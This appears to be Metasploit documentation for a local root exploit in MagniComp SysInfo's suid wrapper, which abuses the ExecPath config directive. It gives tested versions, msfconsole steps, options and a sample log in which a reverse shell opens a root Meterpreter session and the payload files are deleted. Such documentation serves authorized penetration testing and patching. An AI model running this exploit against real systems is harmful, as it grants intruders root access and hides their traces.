## Vulnerable Application

This module attempts to gain root privileges on systems running
MagniComp SysInfo versions prior to 10-H64.

[MagniComp SysInfo](https://www.magnicomp.com/sysinfo/) is a single system
agent and viewer providing extensive IT asset inventory and configuration
information for most major Linux, UNIX, Apple Macintosh, and Microsoft
Windows platforms as well as leading NAS and SAN Storage Systems and
logical volume software solutions.

The .mcsiwrapper suid executable allows loading a config file using the
'--configfile' argument. The 'ExecPath' config directive is used to set
the executable load path. This module abuses this functionality to set
the load path resulting in execution of arbitrary code as root.

This module has been tested successfully on SysInfo versions:

* 10-GA on Solaris 10u11 x86
* 10-H10 on Debian 8 x86_64
* 10-H32 on Fedora 27 x86_64
* 10-H63 on Fedora 20 x86_64

Installers:

* https://www.magnicomp.com/cgi-bin/mcdownload.cgi
* https://www.magnicomp.com/cgi-bin/mcdownload.cgi/Action=ListDDF


## Verification Steps

1. Start `msfconsole`
1. Get a session
1. Do: `use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc`
1. Do: `set SESSION [SESSION]`
1. Do: `check`
1. Do: `run`
1. You should get a new *root* session


## Options

### SYSINFO_DIR

Path to SysInfo directory (default: `/opt/sysinfo`)

### WritableDir

A writable directory file system path. (default: `/tmp`)


## Scenarios

### MagniComp SysInfo version 10-H63 on Fedora 20 x86_64

```
msf > use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc
msf exploit(multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc) > set session 1
session => 1
msf exploit(multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc) > run

[*] Started reverse TCP handler on 172.16.191.244:4444
[*] Using target: Linux
[*] Writing '/tmp/.0rk4PC/vFdxxuBVkh' (21 bytes) ...
[*] Writing '/tmp/.0rk4PC/eoGVzYwGa' (207 bytes) ...
[*] Executing payload...
[*] Sending stage (857352 bytes) to 172.16.191.137
[*] Meterpreter session 2 opened (172.16.191.244:4444 -> 172.16.191.137:42229) at 2018-02-05 07:38:35 -0500
[+] Deleted /tmp/.0rk4PC/vFdxxuBVkh
[+] Deleted /tmp/.0rk4PC/eoGVzYwGa
[+] Deleted /tmp/.0rk4PC

meterpreter > getuid
Server username: uid=0, gid=1000, euid=1000, egid=1000
meterpreter > sysinfo
Computer     : localhost.localdomain
OS           : Fedora 20 (Linux 3.19.8-100.fc20.x86_64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter >
```
